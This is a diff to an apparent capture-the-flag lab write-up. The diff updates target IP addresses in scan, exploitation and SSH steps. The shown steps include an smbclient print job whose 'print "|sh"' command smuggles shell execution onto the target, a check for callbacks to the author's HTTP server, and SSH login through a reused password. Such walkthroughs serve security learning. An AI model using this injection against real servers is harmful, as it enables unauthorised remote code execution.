@@ -10,6 +10,8 @@ Discovered open port 139/tcp on 10.129.244.177
 Discovered open port 445/tcp on 10.129.244.177
 ```
 
+Opened ports: 22,139,445
+
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ nmap -p 22,139,445 -sCV 10.129.244.177 -oN portscan.txt -Pn
@@ -88,12 +90,12 @@ Setup a Python HTTP server.
 Create a print job.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
-❯ smbclient //10.129.87.104/HP-Reception -N -c 'print "|sh"'
+❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
 ```
 
 Check the HTTP server.
 ```bash
-10.129.87.104 - - [02/Aug/2026 21:12:27] "GET / HTTP/1.1" 200
+10.129.244.177 - - [02/Aug/2026 21:12:27] "GET / HTTP/1.1" 200
 ```
 
 Receiving the HTTP request confirms that the payload was executed successfully, indicating that the server is vulnerable.
@@ -122,7 +124,7 @@ Start a listener.
 Create a print job.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
-❯ smbclient //10.129.87.104/HP-Reception -N -c 'print "|sh"'
+❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
 ```
 
 ## Post-exploitation
@@ -169,7 +171,7 @@ iXzvcib3SrpZ
 The password is reused by the user `scott`, allowing SSH access.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
-❯ ssh scott@10.129.87.104
+❯ ssh scott@10.129.244.177
 ```
 
 Read the user flag.
